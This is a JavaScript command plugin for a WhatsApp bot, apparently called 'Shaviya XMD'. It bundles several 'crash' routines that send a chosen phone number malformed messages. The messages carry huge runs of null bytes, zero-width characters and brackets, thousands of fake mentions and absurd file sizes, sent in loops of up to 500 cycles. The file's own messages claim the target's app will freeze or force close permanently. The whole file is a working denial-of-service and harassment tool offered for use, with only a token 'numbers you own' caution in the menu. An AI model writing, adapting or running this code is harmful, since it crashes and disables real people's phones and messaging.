const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [repeat_count]\nExample: .${cmdName} 94712345678 50`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== LAYER 1: 100 MIXED PAYLOADS ====================
async function ttaas(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg", fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217", caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
        height: 1080, width: 1080, mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };

    for (let i = 0; i < 100; i++) {
        // Product
        const productMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    productMessage: {
                        product: {
                            productImage: imageMessage, productId: "449756950375071",
                            title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
                            description: "MY Bad" + "\u2060".repeat(60000),
                            priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                            url: "wa.me/status", productImageCount: 9999999, firstImageId: "9999999999",
                            salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
                        }, businessOwnerJid: "13135550002@s.whatsapp.net"
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, productMsg.message, {});

        // Interactive
        const interactiveMsg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
                body: { text: "\u2060".repeat(80000) }, footer: { text: "\u0000".repeat(90000) },
                nativeFlowMessage: { messageParamsJson: "\u0000".repeat(1500000) },
                contextInfo: { mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
            }
        }, {});
        await conn.relayMessage(target, interactiveMsg.message, {});

        // List
        const listMsg = generateWAMessageFromContent(target, {
            listMessage: {
                title: "🔥 CRASH 🔥" + "\u0000".repeat(920000), footerText: "Xeon Bug" + "\u2060".repeat(50000),
                description: "Xeon Bug" + "\u0000".repeat(50000), buttonText: null, listType: 2,
                productListInfo: { productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }], businessOwnerJid: "0@s.whatsapp.net" }
            }
        }, {});
        await conn.relayMessage(target, listMsg.message, {});

        // Live location
        const locationMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: "p".repeat(50000), degreesLongitude: "p".repeat(50000),
                        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
                        sequenceNumber: "0", jpegThumbnail: ""
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, locationMsg.message, {});

        // Sticker
        const stickerMsg = generateWAMessageFromContent(target, {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                mimetype: "image/webp", fileLength: "9999999999999999999", isAnimated: false,
                contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
            }
        }, {});
        await conn.relayMessage(target, stickerMsg.message, {});
    }
}

// ==================== LAYER 2-9 (exploits) ====================
async function verloadForceDelMsg(conn, target) {
    const VaxzyXx = JSON.stringify({ status: true, criador: "VerloadXApiBug", resultado: { type: "md", ws: { _eventsCount: 800000 } } });
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: { expiration: 1, ephemeralSettingTimestamp: 1,
                        disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                        participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: [target] },
                    body: { text: "Hi I'm Vaxzy!!" + "ោ៝".repeat(10000) },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(20000),
                        buttons: [
                            { name: "single_select", buttonParamsJson: VaxzyXx + "{".repeat(20000) },
                            { name: "call_permission_request", buttonParamsJson: VaxzyXx + "{".repeat(20000) }
                        ]
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, { participant: { jid: target } });
}

async function blankVVIP(conn, target) {
    const MSG = {
        groupInviteMessage: {
            groupJid: "120363370626418572@g.us", inviteCode: "Xx".repeat(10000), inviteExpiration: "99999999999",
            groupName: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(77777),
            caption: "ោ៝".repeat(10000) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000), displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            contextInfo: { expiration: 1, ephemeralSettingTimestamp: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: "0@s.whatsapp.net" },
            body: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(10450) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(32901) + "@1".repeat(50000) },
            footer: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) },
            nativeFlowMessage: { messageParamJson: "{".repeat(25000) },
            buttons: [
                { name: "cta_url", buttonParamJson: "\u0000".repeat(25000) },
                { name: "cta_url", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) }) },
                { name: "cta_call", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) }) },
                { name: "cta_copy", buttonParamJson: "\u0000".repeat(25000) }
            ]
        }
    };
    await conn.relayMessage(target, MSG, { participant: { jid: target } });
}

async function invico1(conn, target) {
    const msg = {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363321780343299@newsletter",
            newsletterName: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
            caption: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
            inviteExpiration: "999999999"
        }
    };
    await conn.relayMessage(target, msg, { participant: { jid: target } });
}

async function uinew(conn, target) {
    const ameliaMsg = {
        interactiveMessage: {
            body: { text: "AMELIA KILL YOU 👿" + "ꦾ".repeat(80000) + "~@1~".repeat(40000) },
            footer: { text: "AMELIA KILL YOU 👿" + "\u200B".repeat(50000) },
            header: {
                title: "https://amelia_overload" + "ꦾ".repeat(80000) + "~@1~".repeat(40000),
                subtitle: "\u200B", hasMediaAttachment: true,
                locationMessage: { degreesLatitude: 0, degreesLongitude: 0, name: "amelia", address: "" }
            },
            nativeFlowMessage: {
                buttons: [
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia6" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia7" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia8" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia9" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia10" }) }
                ]
            }
        }
    };
    await conn.relayMessage(target, ameliaMsg, {});
}

async function uiKiller(conn, target) {
    const locationMsg = {
        locationMessage: {
            degreesLongitude: 0, degreesLatitude: 0,
            name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000),
            url: "https://Amelia." + "ི꒦ྀ".repeat(9000) + ".id",
            address: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮 ⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000),
            contextInfo: {
                externalAdReply: {
                    renderLargerThumbnail: true, showAdAttribution: true,
                    body: "Amelia-Hellboy Kill You", title: "ི꒦ྀ".repeat(9000),
                    sourceUrl: "https://Amelia." + "ི꒦ྀ".repeat(9000) + ".id"
                }
            }
        }
    };
    await conn.relayMessage(target, locationMsg, {});
}

async function frezeui(conn, target) {
    const buttonsMsg = {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    text: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
                    contentText: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "ꦽ".repeat(7000),
                    contextInfo: {
                        forwardingScore: 6, isForwarded: true,
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: { text: "🦠", format: "EXTENSIONS_1" },
                                nativeFlowResponseMessage: {
                                    name: "address_message",
                                    paramsJson: `{\"values\":{\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                                    version: 3
                                }
                            }
                        }
                    },
                    headerType: 1
                }
            }
        }
    };
    await conn.relayMessage(target, buttonsMsg, {});
}

async function forceXsystem(conn, target) {
    const message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    contextInfo: { mentionedJid: [target], isForwarded: true, forwardingScore: 99999999,
                        businessMessageForwardInfo: { businessOwnerJid: target } },
                    body: { text: "Tiada Hidup Dengan Kebahagiaan" + "ꦾ".repeat(35000) },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(15000),
                        buttons: [
                            { name: "single_select", buttonParamsJson: "{".repeat(15000) },
                            { name: "call_permission_request", buttonParamsJson: "{".repeat(15000) },
                            { name: "cta_url", buttonParamsJson: "{".repeat(15000) },
                            { name: "cta_call", buttonParamsJson: "{".repeat(15000) },
                            { name: "cta_copy", buttonParamsJson: "{".repeat(15000) },
                            { name: "cta_reminder", buttonParamsJson: "{".repeat(15000) },
                            { name: "cta_cancel_reminder", buttonParamsJson: "{".repeat(15000) },
                            { name: "address_message", buttonParamsJson: "{".repeat(15000) },
                            { name: "send_location", buttonParamsJson: "{".repeat(15000) },
                            { name: "quick_reply", buttonParamsJson: "{".repeat(15000) },
                            { name: "mpm", buttonParamsJson: "{".repeat(10000) }
                        ]
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, message, { participant: { jid: target } });
}

async function blankUi(conn, target) {
    const ameliaMsg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true",
                            mimetype: "image/jpeg", width: 99999999999999, height: 99999999999999,
                            fileLength: 9999999999999, fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
                            fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
                            mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                            mediaKeyTimestamp: 1753804634
                        }
                    },
                    body: { text: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" + "ꦽ".repeat(50000) },
                    contextInfo: {
                        participant: target,
                        mentionedJid: [ "0@s.whatsapp.net", ...Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net") ]
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
                            { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) }
                        ],
                        messageParamsJson: "{".repeat(10000)
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, ameliaMsg, { participant: { jid: target } });
}

// ==================== MASTER COMBO (one full cycle) ====================
async function oneFullCombo(conn, target) {
    const modules = [
        ttaas, verloadForceDelMsg, blankVVIP, invico1, uinew, uiKiller, frezeui, forceXsystem, blankUi
    ];
    for (const mod of modules) {
        try {
            await mod(conn, target);
        } catch (err) {
            console.error(`Module ${mod.name} failed:`, err.message);
        }
    }
}

// ==================== REPEATED COMBO (non‑stop, configurable) ====================
async function repeatedCombo(conn, target, repeatCount) {
    for (let i = 0; i < repeatCount; i++) {
        console.log(`🔄 Combo cycle ${i+1}/${repeatCount} for ${target}`);
        await oneFullCombo(conn, target);
        // small delay to prevent bot from crashing / rate limiting (100ms)
        await new Promise(r => setTimeout(r, 100));
    }
}

// ==================== OTHER COMMANDS ====================
async function invisibleCrash(conn, target) {
    const invisibleText = '\u2060'.repeat(500000) + '\u2063'.repeat(500000);
    const msg = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: { locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 }, hasMediaAttachment: true },
            body: { text: invisibleText },
            nativeFlowMessage: { messageParamsJson: '\u0000'.repeat(1000000) },
            contextInfo: { mentionedJid: Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function delayHardCrash(conn, target) {
    const mentionedList = [ "13135550002@s.whatsapp.net", ...Array.from({ length: 5000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ];
    const stickerMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                    fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                    mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileLength: { low: 999, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904, firstFrameSidecar: "KN4kQ5pyABRAgA==", isAnimated: true,
                    contextInfo: { participant: target, mentionedJid: mentionedList },
                    stickerSentTs: { low: -1939477883, high: 555, unsigned: false }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, stickerMsg.message, {});
}

// ==================== COMMANDS ====================
cmd({
    pattern: "bug",
    desc: "💀 COMBO CRASH – Send full combo repeatedly (default 1, max 500)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    let repeat = parseInt(args[1]);
    if (isNaN(repeat) || repeat < 1) repeat = 1;
    if (repeat > 500) repeat = 500; // safety limit
    await reply(`💀 *SHAVIYA XMD COMBO CRASH* → ${target}\n_Running ${repeat} full combo cycle(s) (500+ messages each)..._`);
    try {
        await repeatedCombo(conn, target, repeat);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ COMBO CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp will force close / black screen permanently.*\n📊 *Total combos sent: ${repeat}*`;
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption });
        } else {
            await reply(caption);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "shavi-invis",
    desc: "🔮 INVISIBLE CRASH – No visible text, silent freeze",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "shavi-invis");
    if (!target) return;
    await reply(`🔮 *SHAVIYA XMD INVISIBLE CRASH* → ${target}`);
    try {
        await invisibleCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target will freeze with no visible message.*` });
        } else {
            await reply(`✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target will freeze with no visible message.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "delayhard",
    desc: "💀 EXTREME DELAY CRASH – Sticker + massive mentions",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "delayhard");
    if (!target) return;
    await reply(`💀 *DELAY HARD CRASH* → ${target}\n_Sending sticker bomb..._`);
    try {
        await delayHardCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ DELAY HARD SENT → ${target}\n⚠️ *Target WhatsApp will freeze / lag severely.*` });
        } else {
            await reply(`✅ DELAY HARD SENT → ${target}\n⚠️ *Target WhatsApp will freeze / lag severely.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "bugmenu",
    desc: "Show crash menu",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [number] [count] – 💀 Send combo repeatedly (up to 500)*\n*│ 📌 .shavi-invis – 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard – 💀 Extreme sticker bomb*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678       → 1 full combo (500+ msgs)\n> .bug 94712345678 50    → 50 combos (25,000+ msgs)\n> ⚠️ *Extreme power – use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
